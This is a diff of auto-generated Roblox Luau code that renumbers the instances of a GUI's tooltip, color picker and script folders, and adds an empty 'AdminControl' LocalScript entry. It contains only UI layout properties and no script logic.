-G2L["26a"] = Instance.new("UIGradient", G2L["269"]);
-G2L["26a"]["Rotation"] = 90;
-G2L["26a"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};
+G2L["298"] = Instance.new("UIGradient", G2L["297"]);
+G2L["298"]["Rotation"] = 90;
+G2L["298"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};
 
 
 -- StarterGui.T5784YHRGE89ES98T.Tooltip.text
-G2L["26b"] = Instance.new("TextLabel", G2L["267"]);
-G2L["26b"]["TextWrapped"] = true;
-G2L["26b"]["ZIndex"] = 999999999;
-G2L["26b"]["BorderSizePixel"] = 0;
-G2L["26b"]["TextSize"] = 12;
-G2L["26b"]["TextXAlignment"] = Enum.TextXAlignment.Left;
-G2L["26b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["26b"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["26b"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["26b"]["BackgroundTransparency"] = 1;
-G2L["26b"]["Size"] = UDim2.new(1, 0, 1, 0);
-G2L["26b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["26b"]["Text"] = [[--]];
-G2L["26b"]["Name"] = [[text]];
+G2L["299"] = Instance.new("TextLabel", G2L["295"]);
+G2L["299"]["TextWrapped"] = true;
+G2L["299"]["ZIndex"] = 999999999;
+G2L["299"]["BorderSizePixel"] = 0;
+G2L["299"]["TextSize"] = 12;
+G2L["299"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+G2L["299"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["299"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["299"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["299"]["BackgroundTransparency"] = 1;
+G2L["299"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["299"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["299"]["Text"] = [[--]];
+G2L["299"]["Name"] = [[text]];
 
 
 -- StarterGui.T5784YHRGE89ES98T.Tooltip.text.text
-G2L["26c"] = Instance.new("UIStroke", G2L["26b"]);
-G2L["26c"]["Name"] = [[text]];
+G2L["29a"] = Instance.new("UIStroke", G2L["299"]);
+G2L["29a"]["Name"] = [[text]];
 
 
 -- StarterGui.T5784YHRGE89ES98T.Tooltip.text.UIPadding
-G2L["26d"] = Instance.new("UIPadding", G2L["26b"]);
-G2L["26d"]["PaddingLeft"] = UDim.new(0, 5);
+G2L["29b"] = Instance.new("UIPadding", G2L["299"]);
+G2L["29b"]["PaddingLeft"] = UDim.new(0, 5);
 
 
 -- StarterGui.T5784YHRGE89ES98T.Tooltip.UIScale
-G2L["26e"] = Instance.new("UIScale", G2L["267"]);
+G2L["29c"] = Instance.new("UIScale", G2L["295"]);
 
 
 
 -- StarterGui.T5784YHRGE89ES98T.MasterScripts
-G2L["26f"] = Instance.new("Folder", G2L["1"]);
-G2L["26f"]["Name"] = [[MasterScripts]];
+G2L["29d"] = Instance.new("Folder", G2L["1"]);
+G2L["29d"]["Name"] = [[MasterScripts]];
 
 
 -- StarterGui.T5784YHRGE89ES98T.MasterScripts.ToggleMaster
-G2L["270"] = Instance.new("LocalScript", G2L["26f"]);
-G2L["270"]["Name"] = [[ToggleMaster]];
+G2L["29e"] = Instance.new("LocalScript", G2L["29d"]);
+G2L["29e"]["Name"] = [[ToggleMaster]];
 
 
 -- StarterGui.T5784YHRGE89ES98T.MasterScripts.ButtonMaster
-G2L["271"] = Instance.new("LocalScript", G2L["26f"]);
-G2L["271"]["Name"] = [[ButtonMaster]];
+G2L["29f"] = Instance.new("LocalScript", G2L["29d"]);
+G2L["29f"]["Name"] = [[ButtonMaster]];
 
 
 -- StarterGui.T5784YHRGE89ES98T.MasterScripts.TextboxMaster
-G2L["272"] = Instance.new("LocalScript", G2L["26f"]);
-G2L["272"]["Name"] = [[TextboxMaster]];
+G2L["2a0"] = Instance.new("LocalScript", G2L["29d"]);
+G2L["2a0"]["Name"] = [[TextboxMaster]];
 
 
 -- StarterGui.T5784YHRGE89ES98T.MasterScripts.SliderMaster
-G2L["273"] = Instance.new("LocalScript", G2L["26f"]);
-G2L["273"]["Name"] = [[SliderMaster]];
+G2L["2a1"] = Instance.new("LocalScript", G2L["29d"]);
+G2L["2a1"]["Name"] = [[SliderMaster]];
 
 
 -- StarterGui.T5784YHRGE89ES98T.MasterScripts.DropdownMaster
-G2L["274"] = Instance.new("LocalScript", G2L["26f"]);
-G2L["274"]["Name"] = [[DropdownMaster]];
+G2L["2a2"] = Instance.new("LocalScript", G2L["29d"]);
+G2L["2a2"]["Name"] = [[DropdownMaster]];
 
 
 -- StarterGui.T5784YHRGE89ES98T.MasterScripts.ColorPickerMaster
-G2L["275"] = Instance.new("LocalScript", G2L["26f"]);
-G2L["275"]["Name"] = [[ColorPickerMaster]];
+G2L["2a3"] = Instance.new("LocalScript", G2L["29d"]);
+G2L["2a3"]["Name"] = [[ColorPickerMaster]];
 
 
 -- StarterGui.T5784YHRGE89ES98T.MasterScripts.ChatMaster
-G2L["276"] = Instance.new("LocalScript", G2L["26f"]);
-G2L["276"]["Name"] = [[ChatMaster]];
+G2L["2a4"] = Instance.new("LocalScript", G2L["29d"]);
+G2L["2a4"]["Name"] = [[ChatMaster]];
 
 
 -- StarterGui.T5784YHRGE89ES98T.MasterScripts.UserList
-G2L["277"] = Instance.new("LocalScript", G2L["26f"]);
-G2L["277"]["Name"] = [[UserList]];
+G2L["2a5"] = Instance.new("LocalScript", G2L["29d"]);
+G2L["2a5"]["Name"] = [[UserList]];
 
 
 -- StarterGui.T5784YHRGE89ES98T.MasterScripts.MAINCALLS
-G2L["278"] = Instance.new("LocalScript", G2L["26f"]);
-G2L["278"]["Name"] = [[MAINCALLS]];
+G2L["2a6"] = Instance.new("LocalScript", G2L["29d"]);
+G2L["2a6"]["Name"] = [[MAINCALLS]];
 
 
 -- StarterGui.T5784YHRGE89ES98T.SecretScriptsHIDE
-G2L["279"] = Instance.new("Folder", G2L["1"]);
-G2L["279"]["Name"] = [[SecretScriptsHIDE]];
+G2L["2a7"] = Instance.new("Folder", G2L["1"]);
+G2L["2a7"]["Name"] = [[SecretScriptsHIDE]];
 
 
 -- StarterGui.T5784YHRGE89ES98T.SecretScriptsHIDE.AntiDex
-G2L["27a"] = Instance.new("LocalScript", G2L["279"]);
-G2L["27a"]["Name"] = [[AntiDex]];
+G2L["2a8"] = Instance.new("LocalScript", G2L["2a7"]);
+G2L["2a8"]["Name"] = [[AntiDex]];
 
 
 -- StarterGui.T5784YHRGE89ES98T.SecretScriptsHIDE.BlacklistCheck
-G2L["27b"] = Instance.new("LocalScript", G2L["279"]);
-G2L["27b"]["Name"] = [[BlacklistCheck]];
+G2L["2a9"] = Instance.new("LocalScript", G2L["2a7"]);
+G2L["2a9"]["Name"] = [[BlacklistCheck]];
+
+
+-- StarterGui.T5784YHRGE89ES98T.SecretScriptsHIDE.AdminControl
+G2L["2aa"] = Instance.new("LocalScript", G2L["2a7"]);
+G2L["2aa"]["Name"] = [[AdminControl]];
 
 
 -- StarterGui.T5784YHRGE89ES98T.ColorPicker
-G2L["27c"] = Instance.new("Frame", G2L["1"]);
-G2L["27c"]["ZIndex"] = 1000000011;
-G2L["27c"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
-G2L["27c"]["Size"] = UDim2.new(0, 200, 0, 270);
-G2L["27c"]["Position"] = UDim2.new(0.54615, 0, 0.6233, 0);
-G2L["27c"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
-G2L["27c"]["Name"] = [[ColorPicker]];
+G2L["2ab"] = Instance.new("Frame", G2L["1"]);
+G2L["2ab"]["ZIndex"] = 1000000011;
+G2L["2ab"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
+G2L["2ab"]["Size"] = UDim2.new(0, 200, 0, 270);
+G2L["2ab"]["Position"] = UDim2.new(0.54615, 0, 0.6233, 0);
+G2L["2ab"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
+G2L["2ab"]["Name"] = [[ColorPicker]];
 
 
 -- StarterGui.T5784YHRGE89ES98T.ColorPicker.colorpickerScript
-G2L["27d"] = Instance.new("LocalScript", G2L["27c"]);
-G2L["27d"]["Name"] = [[colorpickerScript]];
+G2L["2ac"] = Instance.new("LocalScript", G2L["2ab"]);
+G2L["2ac"]["Name"] = [[colorpickerScript]];
 
 
 -- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout
-G2L["27e"] = Instance.new("Frame", G2L["27c"]);
-G2L["27e"]["ZIndex"] = 99;
-G2L["27e"]["BorderSizePixel"] = 0;
-G2L["27e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["27e"]["Size"] = UDim2.new(1, 0, 1, 0);
-G2L["27e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["27e"]["Name"] = [[innerframelayout]];
-G2L["27e"]["BackgroundTransparency"] = 1;
+G2L["2ad"] = Instance.new("Frame", G2L["2ab"]);
+G2L["2ad"]["ZIndex"] = 99;
+G2L["2ad"]["BorderSizePixel"] = 0;
+G2L["2ad"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["2ad"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["2ad"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["2ad"]["Name"] = [[innerframelayout]];
+G2L["2ad"]["BackgroundTransparency"] = 1;
 
 
 -- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.ACCENT
-G2L["27f"] = Instance.new("Frame", G2L["27e"]);
-G2L["27f"]["BorderSizePixel"] = 0;
-G2L["27f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["27f"]["Size"] = UDim2.new(1, 0, 0, 4);
-G2L["27f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["27f"]["Name"] = [[ACCENT]];
-G2L["27f"]["BackgroundTransparency"] = 1;
+G2L["2ae"] = Instance.new("Frame", G2L["2ad"]);
+G2L["2ae"]["BorderSizePixel"] = 0;
+G2L["2ae"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["2ae"]["Size"] = UDim2.new(1, 0, 0, 4);
+G2L["2ae"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["2ae"]["Name"] = [[ACCENT]];
+G2L["2ae"]["BackgroundTransparency"] = 1;
 
 
 -- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.ACCENT.GuiColor
-G2L["280"] = Instance.new("Frame", G2L["27f"]);
-G2L["280"]["BorderSizePixel"] = 0;
-G2L["280"]["BackgroundColor3"] = Color3.fromRGB(0, 124, 255);
-G2L["280"]["Size"] = UDim2.new(1, -2, 0, 2);
-G2L["280"]["Position"] = UDim2.new(0, 1, 0, 1);
-G2L["280"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["280"]["Name"] = [[GuiColor]];
+G2L["2af"] = Instance.new("Frame", G2L["2ae"]);
+G2L["2af"]["BorderSizePixel"] = 0;
+G2L["2af"]["BackgroundColor3"] = Color3.fromRGB(0, 124, 255);
+G2L["2af"]["Size"] = UDim2.new(1, -2, 0, 2);
+G2L["2af"]["Position"] = UDim2.new(0, 1, 0, 1);
+G2L["2af"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["2af"]["Name"] = [[GuiColor]];
 
 
 -- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.ACCENT.GuiColor.UICorner
-G2L["281"] = Instance.new("UICorner", G2L["280"]);
+G2L["2b0"] = Instance.new("UICorner", G2L["2af"]);
 
 
 
 -- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.text
-G2L["282"] = Instance.new("TextLabel", G2L["27e"]);
-G2L["282"]["TextWrapped"] = true;
-G2L["282"]["ZIndex"] = 999999999;
-G2L["282"]["BorderSizePixel"] = 0;
-G2L["282"]["TextSize"] = 12;
-G2L["282"]["TextXAlignment"] = Enum.TextXAlignment.Left;
-G2L["282"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["282"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["282"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["282"]["BackgroundTransparency"] = 1;
-G2L["282"]["Size"] = UDim2.new(1, 0, 0, 20);
-G2L["282"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["282"]["Text"] = [[--]];
-G2L["282"]["LayoutOrder"] = 1;
-G2L["282"]["Name"] = [[text]];
+G2L["2b1"] = Instance.new("TextLabel", G2L["2ad"]);
+G2L["2b1"]["TextWrapped"] = true;
+G2L["2b1"]["ZIndex"] = 999999999;
+G2L["2b1"]["BorderSizePixel"] = 0;
+G2L["2b1"]["TextSize"] = 12;
+G2L["2b1"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+G2L["2b1"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["2b1"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["2b1"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["2b1"]["BackgroundTransparency"] = 1;
+G2L["2b1"]["Size"] = UDim2.new(1, 0, 0, 20);
+G2L["2b1"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["2b1"]["Text"] = [[--]];
+G2L["2b1"]["LayoutOrder"] = 1;
+G2L["2b1"]["Name"] = [[text]];
 
 
 -- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.text.text
-G2L["283"] = Instance.new("UIStroke", G2L["282"]);
-G2L["283"]["Name"] = [[text]];
+G2L["2b2"] = Instance.new("UIStroke", G2L["2b1"]);
+G2L["2b2"]["Name"] = [[text]];
 
 
 -- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.text.UIPadding
-G2L["284"] = Instance.new("UIPadding", G2L["282"]);
-G2L["284"]["PaddingLeft"] = UDim.new(0, 5);
+G2L["2b3"] = Instance.new("UIPadding", G2L["2b1"]);
+G2L["2b3"]["PaddingLeft"] = UDim.new(0, 5);
 
 
 -- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.UIListLayout
-G2L["285"] = Instance.new("UIListLayout", G2L["27e"]);
-G2L["285"]["SortOrder"] = Enum.SortOrder.LayoutOrder;
+G2L["2b4"] = Instance.new("UIListLayout", G2L["2ad"]);
+G2L["2b4"]["SortOrder"] = Enum.SortOrder.LayoutOrder;
 
 
 -- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.canvashue
-G2L["286"] = Instance.new("Frame", G2L["27e"]);
-G2L["286"]["BorderSizePixel"] = 0;
-G2L["286"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["286"]["Size"] = UDim2.new(1, 0, 0, 180);
-G2L["286"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["286"]["Name"] = [[canvashue]];
-G2L["286"]["LayoutOrder"] = 2;
-G2L["286"]["BackgroundTransparency"] = 1;
+G2L["2b5"] = Instance.new("Frame", G2L["2ad"]);
+G2L["2b5"]["BorderSizePixel"] = 0;
+G2L["2b5"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["2b5"]["Size"] = UDim2.new(1, 0, 0, 180);
+G2L["2b5"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["2b5"]["Name"] = [[canvashue]];
+G2L["2b5"]["LayoutOrder"] = 2;
+G2L["2b5"]["BackgroundTransparency"] = 1;
 
 
 -- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.canvashue.canvasFrame
-G2L["287"] = Instance.new("Frame", G2L["286"]);
-G2L["287"]["BorderSizePixel"] = 0;
-G2L["287"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["287"]["Size"] = UDim2.new(1, -20, 1, 0);
-G2L["287"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["287"]["Name"] = [[canvasFrame]];
-G2L["287"]["BackgroundTransparency"] = 1;
+G2L["2b6"] = Instance.new("Frame", G2L["2b5"]);
+G2L["2b6"]["BorderSizePixel"] = 0;
+G2L["2b6"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["2b6"]["Size"] = UDim2.new(1, -20, 1, 0);
+G2L["2b6"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["2b6"]["Name"] = [[canvasFrame]];
+G2L["2b6"]["BackgroundTransparency"] = 1;
 
 
 -- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.canvashue.canvasFrame.canvas
-G2L["288"] = Instance.new("TextButton", G2L["287"]);
-G2L["288"]["TextTransparency"] = 1;
-G2L["288"]["TextSize"] = 14;
-G2L["288"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["288"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["288"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["288"]["Size"] = UDim2.new(1, 0, 1, 0);
-G2L["288"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
-G2L["288"]["Name"] = [[canvas]];
+G2L["2b7"] = Instance.new("TextButton", G2L["2b6"]);
+G2L["2b7"]["TextTransparency"] = 1;
+G2L["2b7"]["TextSize"] = 14;
+G2L["2b7"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["2b7"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["2b7"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["2b7"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["2b7"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
+G2L["2b7"]["Name"] = [[canvas]];
 
 
 -- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.canvashue.canvasFrame.canvas.dot
-G2L["289"] = Instance.new("Frame", G2L["288"]);
-G2L["289"]["ZIndex"] = 999999999;
-G2L["289"]["BorderSizePixel"] = 0;
-G2L["289"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["289"]["Size"] = UDim2.new(0, 4, 0, 4);
-G2L["289"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);
-G2L["289"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["289"]["Name"] = [[dot]];
+G2L["2b8"] = Instance.new("Frame", G2L["2b7"]);
+G2L["2b8"]["ZIndex"] = 999999999;
+G2L["2b8"]["BorderSizePixel"] = 0;
+G2L["2b8"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["2b8"]["Size"] = UDim2.new(0, 4, 0, 4);
+G2L["2b8"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);
+G2L["2b8"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["2b8"]["Name"] = [[dot]];
 
 
 -- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.canvashue.canvasFrame.canvas.dot.UICorner
-G2L["28a"] = Instance.new("UICorner", G2L["289"]);
-G2L["28a"]["CornerRadius"] = UDim.new(0, 999);
+G2L["2b9"] = Instance.new("UICorner", G2L["2b8"]);
+G2L["2b9"]["CornerRadius"] = UDim.new(0, 999);
 
 
 -- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.canvashue.canvasFrame.canvas.dot.UIStroke
-G2L["28b"] = Instance.new("UIStroke", G2L["289"]);
+G2L["2ba"] = Instance.new("UIStroke", G2L["2b8"]);
 
 
 
 -- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.canvashue.canvasFrame.UIPadding
-G2L["28c"] = Instance.new("UIPadding", G2L["287"]);
-G2L["28c"]["PaddingTop"] = UDim.new(0, 3);
-G2L["28c"]["PaddingRight"] = UDim.new(0, 3);
-G2L["28c"]["PaddingLeft"] = UDim.new(0, 3);
-G2L["28c"]["PaddingBottom"] = UDim.new(0, 3);
+G2L["2bb"] = Instance.new("UIPadding", G2L["2b6"]);
+G2L["2bb"]["PaddingTop"] = UDim.new(0, 3);
+G2L["2bb"]["PaddingRight"] = UDim.new(0, 3);
+G2L["2bb"]["PaddingLeft"] = UDim.new(0, 3);
+G2L["2bb"]["PaddingBottom"] = UDim.new(0, 3);
 
 
 -- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.canvashue.hueFrame
-G2L["28d"] = Instance.new("Frame", G2L["286"]);
-G2L["28d"]["BorderSizePixel"] = 0;
-G2L["28d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["28d"]["Size"] = UDim2.new(0, 20, 1, 0);
-G2L["28d"]["Position"] = UDim2.new(1, -20, 0, 0);
-G2L["28d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["28d"]["Name"] = [[hueFrame]];
-G2L["28d"]["BackgroundTransparency"] = 1;
+G2L["2bc"] = Instance.new("Frame", G2L["2b5"]);
+G2L["2bc"]["BorderSizePixel"] = 0;
+G2L["2bc"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["2bc"]["Size"] = UDim2.new(0, 20, 1, 0);
+G2L["2bc"]["Position"] = UDim2.new(1, -20, 0, 0);
+G2L["2bc"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["2bc"]["Name"] = [[hueFrame]];
+G2L["2bc"]["BackgroundTransparency"] = 1;
 
 
 -- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.canvashue.hueFrame.hue
-G2L["28e"] = Instance.new("TextButton", G2L["28d"]);
-G2L["28e"]["TextTransparency"] = 1;
-G2L["28e"]["TextSize"] = 14;
-G2L["28e"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["28e"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["28e"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["28e"]["Size"] = UDim2.new(1, 0, 1, 0);
-G2L["28e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["28e"]["Name"] = [[hue]];
+G2L["2bd"] = Instance.new("TextButton", G2L["2bc"]);
+G2L["2bd"]["TextTransparency"] = 1;
+G2L["2bd"]["TextSize"] = 14;
+G2L["2bd"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["2bd"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["2bd"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["2bd"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["2bd"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["2bd"]["Name"] = [[hue]];
 
 
 -- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.canvashue.hueFrame.hue.line
-G2L["28f"] = Instance.new("Frame", G2L["28e"]);
-G2L["28f"]["ZIndex"] = 999999999;
-G2L["28f"]["BorderSizePixel"] = 0;
-G2L["28f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["28f"]["Size"] = UDim2.new(1, 0, 0, 1);
-G2L["28f"]["Position"] = UDim2.new(0, 0, 0.5, 0);
-G2L["28f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["28f"]["Name"] = [[line]];
+G2L["2be"] = Instance.new("Frame", G2L["2bd"]);
+G2L["2be"]["ZIndex"] = 999999999;
+G2L["2be"]["BorderSizePixel"] = 0;
+G2L["2be"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["2be"]["Size"] = UDim2.new(1, 0, 0, 1);
+G2L["2be"]["Position"] = UDim2.new(0, 0, 0.5, 0);
+G2L["2be"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["2be"]["Name"] = [[line]];
 
 
 -- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.canvashue.hueFrame.hue.line.UIStroke
-G2L["290"] = Instance.new("UIStroke", G2L["28f"]);
+G2L["2bf"] = Instance.new("UIStroke", G2L["2be"]);
 
 
 
 -- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.canvashue.hueFrame.UIPadding
-G2L["291"] = Instance.new("UIPadding", G2L["28d"]);
-G2L["291"]["PaddingTop"] = UDim.new(0, 3);
-G2L["291"]["PaddingRight"] = UDim.new(0, 3);
-G2L["291"]["PaddingLeft"] = UDim.new(0, 1);
-G2L["291"]["PaddingBottom"] = UDim.new(0, 3);
+G2L["2c0"] = Instance.new("UIPadding", G2L["2bc"]);
+G2L["2c0"]["PaddingTop"] = UDim.new(0, 3);
+G2L["2c0"]["PaddingRight"] = UDim.new(0, 3);
+G2L["2c0"]["PaddingLeft"] = UDim.new(0, 1);
+G2L["2c0"]["PaddingBottom"] = UDim.new(0, 3);
 
 
 -- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.transparency
-G2L["292"] = Instance.new("Frame", G2L["27e"]);
-G2L["292"]["BorderSizePixel"] = 0;
-G2L["292"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["292"]["Size"] = UDim2.new(1, 0, 0, 18);
-G2L["292"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["292"]["Name"] = [[transparency]];
-G2L["292"]["LayoutOrder"] = 3;
-G2L["292"]["BackgroundTransparency"] = 1;
+G2L["2c1"] = Instance.new("Frame", G2L["2ad"]);
+G2L["2c1"]["BorderSizePixel"] = 0;
+G2L["2c1"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["2c1"]["Size"] = UDim2.new(1, 0, 0, 18);
+G2L["2c1"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["2c1"]["Name"] = [[transparency]];
+G2L["2c1"]["LayoutOrder"] = 3;
+G2L["2c1"]["BackgroundTransparency"] = 1;
 
 
 -- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.transparency.transparencyFrame
-G2L["293"] = Instance.new("Frame", G2L["292"]);
-G2L["293"]["BorderSizePixel"] = 0;
-G2L["293"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["293"]["Size"] = UDim2.new(1, 0, 1, 0);
-G2L["293"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["293"]["Name"] = [[transparencyFrame]];
-G2L["293"]["BackgroundTransparency"] = 1;
+G2L["2c2"] = Instance.new("Frame", G2L["2c1"]);
+G2L["2c2"]["BorderSizePixel"] = 0;
+G2L["2c2"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["2c2"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["2c2"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["2c2"]["Name"] = [[transparencyFrame]];
+G2L["2c2"]["BackgroundTransparency"] = 1;
 
 
 -- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.transparency.transparencyFrame.slider
-G2L["294"] = Instance.new("TextButton", G2L["293"]);
-G2L["294"]["TextTransparency"] = 1;
-G2L["294"]["TextSize"] = 14;
-G2L["294"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["294"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["294"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["294"]["Size"] = UDim2.new(1, 0, 1, 0);
-G2L["294"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["294"]["Name"] = [[slider]];
+G2L["2c3"] = Instance.new("TextButton", G2L["2c2"]);
+G2L["2c3"]["TextTransparency"] = 1;
+G2L["2c3"]["TextSize"] = 14;
+G2L["2c3"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["2c3"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["2c3"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["2c3"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["2c3"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["2c3"]["Name"] = [[slider]];
 
 
 -- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.transparency.transparencyFrame.slider.line
-G2L["295"] = Instance.new("Frame", G2L["294"]);
-G2L["295"]["ZIndex"] = 999999999;
-G2L["295"]["BorderSizePixel"] = 0;
-G2L["295"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["295"]["Size"] = UDim2.new(0, 1, 1, 0);
-G2L["295"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["295"]["Name"] = [[line]];
+G2L["2c4"] = Instance.new("Frame", G2L["2c3"]);
+G2L["2c4"]["ZIndex"] = 999999999;
+G2L["2c4"]["BorderSizePixel"] = 0;
+G2L["2c4"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
